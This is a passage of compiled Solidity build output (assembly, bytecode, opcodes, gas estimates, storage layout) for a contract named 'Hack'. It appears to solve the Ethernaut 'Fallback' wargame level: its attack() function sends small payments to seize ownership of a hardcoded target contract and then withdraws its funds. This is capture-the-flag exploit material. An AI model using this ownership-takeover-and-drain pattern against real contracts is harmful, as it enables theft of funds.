\"#utility.yul\":5576:5655   */\n      tag_123\n      tag_57\n      jump\t// in\n    tag_123:\n        /* \"#utility.yul\":5538:5657   */\n    tag_122:\n        /* \"#utility.yul\":5696:5697   */\n      0x00\n        /* \"#utility.yul\":5721:5785   */\n      tag_124\n        /* \"#utility.yul\":5777:5784   */\n      dup5\n        /* \"#utility.yul\":5768:5774   */\n      dup3\n        /* \"#utility.yul\":5757:5766   */\n      dup6\n        /* \"#utility.yul\":5753:5775   */\n      add\n        /* \"#utility.yul\":5721:5785   */\n      tag_70\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":5711:5785   */\n      swap2\n      pop\n        /* \"#utility.yul\":5667:5795   */\n      pop\n        /* \"#utility.yul\":5451:5802   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220ff8949c9f081b70be0cf168bee1f7ecfcdb83ad43bdc31472df44ab339c0b47664736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052730d82ed8db37da41ca5e0370c1c321c9b816baff25f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801560c1575f5ffd5b50610718806100cf5f395ff3fe608060405260043610610037575f3560e01c8063893d20e8146100425780639e5faafc1461006c578063f10fdf5c146100765761003e565b3661003e57005b5f5ffd5b34801561004d575f5ffd5b506100566100a0565b60405161006391906104c9565b60405180910390f35b610074610134565b005b348015610081575f5ffd5b5061008a6103f6565b60405161009791906104fa565b60405180910390f35b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561010b573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061012f9190610541565b905090565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d7bb99ba60016040518263ffffffff1660e01b81526004015f604051808303818588803b15801561019c575f5ffd5b505af11580156101ae573d5f5f3e3d5ffd5b50505050505f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660016040516101f990610599565b5f6040518083038185875af1925050503d805f8114610233576040519150601f19603f3d011682016040523d82523d5f602084013e610238565b606091505b505090508061027c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161027390610607565b60405180910390fd5b3073ffffffffffffffffffffffffffffffffffffffff1660015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156102fd573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103219190610541565b73ffffffffffffffffffffffffffffffffffffffff1614610377576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161036e9061066f565b60405180910390fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156103dd575f5ffd5b505af11580156103ef573d5f5f3e3d5ffd5b5050505050565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f10fdf5c6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610461573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061048591906106b7565b905090565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6104b38261048a565b9050919050565b6104c3816104a9565b82525050565b5f6020820190506104dc5f8301846104ba565b92915050565b5f819050919050565b6104f4816104e2565b82525050565b5f60208201905061050d5f8301846104eb565b92915050565b5f5ffd5b610520816104a9565b811461052a575f5ffd5b50565b5f8151905061053b81610517565b92915050565b5f6020828403121561055657610555610513565b5b5f6105638482850161052d565b91505092915050565b5f81905092915050565b50565b5f6105845f8361056c565b915061058f82610576565b5f82019050919050565b5f6105a382610579565b9150819050919050565b5f82825260208201905092915050565b7f46616c6c6261636b2063616c6c206661696c65640000000000000000000000005f82015250565b5f6105f16014836105ad565b91506105fc826105bd565b602082019050919050565b5f6020820190508181035f83015261061e816105e5565b9050919050565b7f4861636b206973206e6f7420746865206f776e657221000000000000000000005f82015250565b5f6106596016836105ad565b915061066482610625565b602082019050919050565b5f6020820190508181035f8301526106868161064d565b9050919050565b610696816104e2565b81146106a0575f5ffd5b50565b5f815190506106b18161068d565b92915050565b5f602082840312156106cc576106cb610513565b5b5f6106d9848285016106a3565b9150509291505056fea2646970667358221220ff8949c9f081b70be0cf168bee1f7ecfcdb83ad43bdc31472df44ab339c0b47664736f6c634300081e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0xD82ED8DB37DA41CA5E0370C1C321C9B816BAFF2 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH1 0xC1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x718 DUP1 PUSH2 0xCF PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x893D20E8 EQ PUSH2 0x42 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x6C JUMPI DUP1 PUSH4 0xF10FDF5C EQ PUSH2 0x76 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4D JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x56 PUSH2 0xA0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x63 SWAP2 SWAP1 PUSH2 0x4C9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x74 PUSH2 0x134 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x81 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x8A PUSH2 0x3F6 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x97 SWAP2 SWAP1 PUSH2 0x4FA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x8DA5CB5B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x10B JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x12F SWAP2 SWAP1 PUSH2 0x541 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD7BB99BA PUSH1 0x1 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x19C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1AE JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x40 MLOAD PUSH2 0x1F9 SWAP1 PUSH2 0x599 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x233 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x238 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x27C JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x273 SWAP1 PUSH2 0x607 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x8DA5CB5B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2FD JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x321 SWAP2 SWAP1 PUSH2 0x541 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x377 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x36E SWAP1 PUSH2 0x66F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3DD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3EF JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF10FDF5C PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x461 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x485 SWAP2 SWAP1 PUSH2 0x6B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x4B3 DUP3 PUSH2 0x48A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4C3 DUP2 PUSH2 0x4A9 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4DC PUSH0 DUP4 ADD DUP5 PUSH2 0x4BA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4F4 DUP2 PUSH2 0x4E2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x50D PUSH0 DUP4 ADD DUP5 PUSH2 0x4EB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x520 DUP2 PUSH2 0x4A9 JUMP JUMPDEST DUP2 EQ PUSH2 0x52A JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x53B DUP2 PUSH2 0x517 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x556 JUMPI PUSH2 0x555 PUSH2 0x513 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x563 DUP5 DUP3 DUP6 ADD PUSH2 0x52D JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH2 0x584 PUSH0 DUP4 PUSH2 0x56C JUMP JUMPDEST SWAP2 POP PUSH2 0x58F DUP3 PUSH2 0x576 JUMP JUMPDEST PUSH0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x5A3 DUP3 PUSH2 0x579 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x46616C6C6261636B2063616C6C206661696C6564000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x5F1 PUSH1 0x14 DUP4 PUSH2 0x5AD JUMP JUMPDEST SWAP2 POP PUSH2 0x5FC DUP3 PUSH2 0x5BD JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x61E DUP2 PUSH2 0x5E5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4861636B206973206E6F7420746865206F776E65722100000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x659 PUSH1 0x16 DUP4 PUSH2 0x5AD JUMP JUMPDEST SWAP2 POP PUSH2 0x664 DUP3 PUSH2 0x625 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x686 DUP2 PUSH2 0x64D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x696 DUP2 PUSH2 0x4E2 JUMP JUMPDEST DUP2 EQ PUSH2 0x6A0 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x6B1 DUP2 PUSH2 0x68D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x6CC JUMPI PUSH2 0x6CB PUSH2 0x513 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x6D9 DUP5 DUP3 DUP6 ADD PUSH2 0x6A3 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SELFDESTRUCT DUP10 BLOBHASH 0xC9 CREATE DUP2 0xB7 SIGNEXTEND RJUMP 0xCF16 DUP12 RETURNCONTRACT 0x1F PUSH31 0xCFCDB83AD43BDC31472DF44AB339C0B47664736F6C634300081E0033000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "363200",
						"executionCost": "51062",
						"totalCost": "414262"
					},
					"external": {
						"attack()": "infinite",
						"getContribution()": "infinite",
						"getOwner()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"getContribution()": "f10fdf5c",
					"getOwner()": "893d20e8"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 131,
						"contract": "security/etheranut/Fallback/Hack.sol:Hack",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_address_payable"
					},
					{
						"astId": 137,
						"contract": "security/etheranut/Fallback/Hack.sol:Hack",
						"label": "fb",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(Fallback)125"
					}
				],
				"types": {
					"t_address_payable": {
						"encoding": "inplace",
						"label": "address payable",
						"numberOfBytes": "20"
					},
					"t_contract(Fallback)125": {
						"encoding": "inplace",
						"label": "contract Fallback",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}